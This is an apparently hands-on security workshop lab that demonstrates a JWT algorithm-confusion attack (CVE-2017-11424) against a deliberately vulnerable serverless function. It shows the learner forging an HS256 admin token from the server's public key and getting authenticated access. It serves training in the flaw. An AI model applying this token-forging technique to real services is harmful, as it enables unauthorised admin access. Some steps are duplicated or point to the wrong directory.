# **Algorithm Confusion**

---
> #### You can read more about this flaw: [CVE-2017-11424](https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=873244) and [Auth0 Blog](https://auth0.com/blog/critical-vulnerabilities-in-json-web-token-libraries/)

### **Lab Image : `Serverless`**

---

> **Note:** If you have not setup your aws cli follow [AWS-CLI-Configuration](../aws-configure/README.md) under the `Setup` section*

#### Step 1:

* Navigate to the `Serverless-Workshop` directory on the provisioned server

```commandline
cd /root/labs/Serverless-Workshop/XXE
```

* Activate the python virtual environment

```commandline
pipenv shell
```

* Navigate to the `Algo-Confusion` directory

```commandline
cd /root/labs/Serverless-Workshop/Algo-Confusion
```

* Install the necessary requirements

```commandline
sls plugin install -n serverless-python-requirements
```

---

#### Step 2:

* Take a look at the contents of the `serverless.yml` [here](https://github.com/we45/Serverless-Workshop/blob/master/Algo-Confusion/serverless.yml)

```commandline
cat serverless.yml
```

---

#### Step 3:

* Deploy the function and wait for the deployment to complete.

```commandline
sls deploy
```


* Once the deployment is complete, an API endpoint(s) is displayed.

> **EXAMPLE**:

```text
Serverless: Stack update finished...
Service Information
service: we45-sls-workshop-algo-confusion
stage: dev
region: us-west-2
stack: we45-sls-workshop-algo-confusion-dev
resources: 18
api keys:
  None
endpoints:
  GET - https://XXXXXXX.execute-api.us-west-2.amazonaws.com/dev/init
  GET - https://XXXXXX.execute-api.us-west-2.amazonaws.com/dev/verify
functions:
  init-algo: we45-sls-workshop-algo-confusion-dev-init-algo
  verify-algo: we45-sls-workshop-algo-confusion-dev-verify-algo
```

---

#### Step 4:

* Run a GET request against the `/dev/init` endpoint

```commandline
http GET https://XXXXXXX.execute-api.us-west-2.amazonaws.com/dev/init
```

* The response should be similar to the one below.

> **EXAMPLE**:
```json
{"token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJ1c2VyIjoidXNlciIsImF1dGhlbnRpY2F0ZWQiOmZhbHNlfQ.Nz39CRtIFrCsX76B9Dq0aEOSsWQ9UwDFNqla1Xj1PHiIOSh0WFcJHWEO1NF7YKq6Uv8C__tKQA2fg3qH_m7gLSLkQSf2eGRAubJXMU2XRRlkhMKvI6iksEnjUBvRAbt_UhN5mDcXHjBpX_1q2wadmVbiBz6YkfkffdTMas7ywLFK43tKvL9Iw32fRgoP__K93EaYdvT8Wxm0LdMU_RxmBqjrf4nwTrGynwoWqc2ZRKYa7tZMNCGNIEiNQxK1b4p39MpZqwhIVkFsFMNwd_jECE0nfzcskTQdtZG4KC1WLSnOB7XNjWwAM_NUujCp_sB_iTcEGQlBfo-Oxx5yULXSBA"}
```

---

#### Step 5:

* Navigate to `Serverless-Workshop` and install the necessary requirements

```commandline
cd /root/labs/Serverless-Workshop/
```
```commandline
pip3 install pipenv
```
```commandline
pipenv install pyjwt && pipenv install huepy
```

---

#### Step 6:

* Navigate to the `Algo-Confusion` directory
 
 ```commandline
 cd /root/labs/Serverless-Workshop/Algo-Confusion
 ```

* Generate a token using `public.pem` file

```commandline
python token_gen.py public.pem
```

* The response should be similar to the one below.

> **EXAMPLE**:
```text
[+] Token is:
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiYWRtaW4iLCJhdXRoZW50aWNhdGVkIjp0cnVlfQ.kdps5gagmmxBnnwtAIuEtJBMu6rWjG8wY4V2X9jlfOM
```

---

#### Step 7:

* Using the token generated, run an authorized GET request.

```commandline
http GET https://XXXXXX.execute-api.us-west-2.amazonaws.com/dev/verify Authorization:eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiYWRtaW4iLCJhdXRoZW50aWNhdGVkIjp0cnVlfQ.kdps5gagmmxBnnwtAIuEtJBMu6rWjG8wY4V2X9jlfOM
```

* The response should be similar to the one below.

> **EXAMPLE**:

```text
HTTP/1.1 200 OK
Connection: keep-alive
Content-Length: 40
Content-Type: application/json
x-amzn-RequestId: e66e15fb-b1b2-11e9-8818-53f47d545fa4

{
    "authenticated": true,
    "user": "admin"
}
```

---

#### *Teardown*:

* Navigate to the `Algo-Confusion` directory
 
 ```commandline
 cd /root/labs/Serverless-Workshop/Algo-Confusion
 ```

* Remove the serverless function that was deployed

```commandline
sls remove --force
```

* Deactivate the python-virtualenvironment

```commandline
deactivate
```
```commandline
exit
```

* Step 15: Run `sls remove --force` to remove stack

```commandline
sls remove --force
```

* Step 16: Deactivate `pipenv` using `deactivate` command

```commandline
deactivate
```

```commandline
exit
```
